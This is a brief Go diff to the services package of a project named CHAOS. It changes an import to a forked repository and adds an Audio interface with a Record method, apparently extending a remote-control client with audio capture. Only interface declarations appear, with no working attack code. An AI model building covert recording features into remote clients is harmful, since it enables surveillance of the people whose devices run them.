@@ -2,8 +2,9 @@ package services
 
 import (
 	"errors"
-	"github.com/tiagorlampert/CHAOS/client/app/entities"
 	"time"
+
+	"github.com/justadoll/CHAOS/client/app/entities"
 )
 
 var (
@@ -60,4 +61,8 @@ type OS interface {
 
 type URL interface {
 	OpenURL(url string) error
+}
+
+type Audio interface {
+	Record(raw_seconds string) error
 }
